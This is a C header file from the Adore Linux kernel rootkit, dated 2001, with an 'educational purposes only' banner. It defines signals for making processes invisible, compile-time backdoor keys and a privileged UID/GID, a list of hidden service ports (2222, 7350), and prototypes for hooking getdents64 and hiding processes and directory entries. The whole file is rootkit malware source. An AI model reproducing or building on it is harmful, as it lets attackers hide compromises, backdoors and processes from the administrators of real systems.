/*** (C) 2001 by Stealth -- http://spider.scorpions.net/~stealth
 ***	
 ***
 *** (C)'ed Under a BSDish license. Please look at LICENSE-file.
 *** SO YOU USE THIS AT YOUR OWN RISK!
 *** YOU ARE ONLY ALLOWED TO USE THIS IN LEGAL MANNERS. 
 *** !!! FOR EDUCATIONAL PURPOSES ONLY !!!
 ***
 ***	-> Use ava to get all the things workin'.
 ***
 *** Greets fly out to all my friends. You know who you are. :)
 *** Special thanks to Shivan for granting root access to his
 *** SMP box for adore-development. More thx to skyper for also
 *** granting root access.
 ***
 ***/
#ifndef __ADORE_H__
#define __ADORE_H__

/* to check whether request is legal */
#define PF_AUTH 0x1000000

/* whenever you change this, don't forget to do so
 * in libinvisible too!!!
 */
#define SIGINVISIBLE 100
#define SIGVISIBLE   101
#define SIGREMOVE    102

/* The ioctl special-command */
#ifndef ELITE_CMD
#error "No ELITE_CMD given!"
#endif

#ifndef ELITE_UID
#error "No ELITE_UID given!"
#endif

#ifndef ELITE_GID
#error "No ELITE_GID given!"
#endif

#ifndef ADORE_KEY
#error "No ADORE_KEY given!"
#endif

#define ADORE_VERSION CURRENT_ADORE

/* Very old kernels don't have an equivalent macro... */
#define LinuxVersionCode(v, p, s) (((v)<<16)+((p)<<8)+(s))

u_short HIDDEN_SERVICES[] = 
	{2222, 7350, 0};

/* END CHANGE SECTION */

/* assigned by init_module */
struct task_struct *init_hook = NULL;

/* own version. kernel's doesn't work in modules */
#undef for_each_task
#define for_each_task(p) for (p = init_hook; (p = p->next_task) != init_hook;)

struct linux_dirent64 {
        u64             d_ino;
        s64             d_off;
        unsigned short  d_reclen;
        unsigned char   d_type;
        char            d_name[0];
};

long (*o_getdents64)(unsigned int, void *, unsigned int);

/* Protypes */
int cleanup_module();
int remove_process(pid_t);
int strip_invisible();
int unstrip_invisible();
int is_secret(struct super_block *, struct dirent *);

int my_atoi(const char *);
struct task_struct *my_find_task(pid_t);

extern struct module *module_list;


#endif /* __ADORE_H__ */
